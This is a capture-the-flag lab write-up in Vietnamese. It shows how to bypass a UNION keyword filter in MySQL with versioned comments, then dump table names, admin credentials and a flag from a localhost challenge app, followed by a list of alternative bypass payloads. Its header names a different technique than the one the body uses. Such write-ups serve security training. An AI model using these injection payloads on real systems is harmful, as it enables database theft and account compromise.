# SQLi-045: MySQL UNION Filter Bypass - Writeup

## 📋 Tóm Tắt

**Kỹ thuật:** UNION keyword bypass bằng inline comments `Un/**/IoN`  
**DBMS:** MySQL  
**Flag:** `FLAG{un10n_c4s3_v4r14t10n_byp4ss}`

---

## 🔍 Bước 1: DETECT - Phát Hiện Lỗ Hổng

### 1.1. Phân tích ứng dụng

```bash
# Request bình thường
curl "http://localhost:5045/article?id=1"
# → Response: Bài viết #1

# Thử UNION injection
curl "http://localhost:5045/article?id=1 UNION SELECT 1,2,3,4"
# → Response: "Potential SQL injection detected! UNION keyword is blocked."
```

### 1.2. Xác định filter

IDS đang chặn từ khóa `UNION` với regex case-insensitive.

### 1.3. Test bypass với MySQL versioned comments

```bash
# Filter chặn từ khóa "union" và strip /**/ nhưng quên strip /*!...*/
# Thử với MySQL versioned comment
curl "http://localhost:5045/article?id=0%20/*!50000UNION*/%20SELECT%201,2,3,4--%20-"
# → Kết quả trả về! Filter bypassed!

# Verify với version check
curl "http://localhost:5045/article?id=0%20/*!50000UNION*/%20SELECT%201,@@version,3,4--%20-"
# → Hiển thị MySQL version
```

**SQLi confirmed với MySQL versioned comment bypass!**

---

## 🎯 Bước 2: IDENTIFY - Xác Định DBMS

```bash
# MySQL version
curl "http://localhost:5045/article?id=0 /*!50000UNION*/ SELECT 1,@@version,3,4-- -"
# → Hiển thị: 8.0.x → MySQL confirmed
```

---

## 🔢 Bước 3: ENUMERATE - Liệt Kê

### 3.1. Liệt kê bảng

```bash
curl "http://localhost:5045/article?id=0 /*!50000UNION*/ SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- -"
```

**Kết quả:** articles, users, flags

### 3.2. Liệt kê cột bảng flags

```bash
curl "http://localhost:5045/article?id=0 /*!50000UNION*/ SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='flags'-- -"
```

**Kết quả:** id, name, value

---

## ⬆️ Bước 4: ESCALATE

### Extract admin credentials

```bash
curl "http://localhost:5045/article?id=0 /*!50000UNION*/ SELECT 1,username,password,4 FROM users-- -"
```

**Kết quả:** admin:Un10n_Byp4ss_Adm1n!

---

## 🏆 Bước 5: EXFILTRATE - Lấy Flag

```bash
curl "http://localhost:5045/article?id=0 /*!50000UNION*/ SELECT 1,name,value,4 FROM flags-- -"
```

🎉 **FLAG:** `FLAG{un10n_c4s3_v4r14t10n_byp4ss}`

---

## 🔧 Alternative Bypass Techniques

```sql
-- MySQL versioned comment với version khác
0 /*!12345UNION*/ SELECT 1,2,3,4-- -

-- Kết hợp với /**/ cho các keyword khác
0 /*!50000UNION*//**/SELECT/**/1,2,3,4-- -

-- Nested versioned comments
0 /*!50000UN/*!*/ION*/ SELECT 1,2,3,4-- -
```

---

## ✅ Flag

```
FLAG{un10n_c4s3_v4r14t10n_byp4ss}
```
